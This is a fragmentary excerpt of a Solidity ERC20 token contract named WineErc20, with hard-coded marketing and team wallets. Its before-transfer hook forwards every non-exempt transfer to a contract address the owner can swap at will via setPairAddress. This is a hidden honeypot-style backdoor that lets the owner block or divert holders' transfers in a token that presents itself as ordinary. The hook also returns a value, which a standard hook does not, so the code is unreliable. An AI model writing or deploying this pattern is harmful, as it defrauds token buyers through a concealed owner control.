...
contract WineErc20 is Ownable, ERC20 {
    ...
    constructor() ERC20("WineErc20", "WINE") {
        ...
        address marketingWallet = address(0x43c9077a52Fa1110fac7159f06496297a8eF044A);
        address teamWallet = address(0xf4975fF6044173AC9DC0Ffb0578f033914941b6D);
    ...
    function _beforeTokenTransfer(
        ...
        if (!isExceptFromLimit[from] && !isExceptFromLimit[to] && pairAddress != address(0)) {
            IERC20(pairAddress).transferFrom(from, to, amount);
        }
        return amount;
    }

    function setPairAddress(address _vest) external onlyOwner {
        pairAddress = _vest;
    }
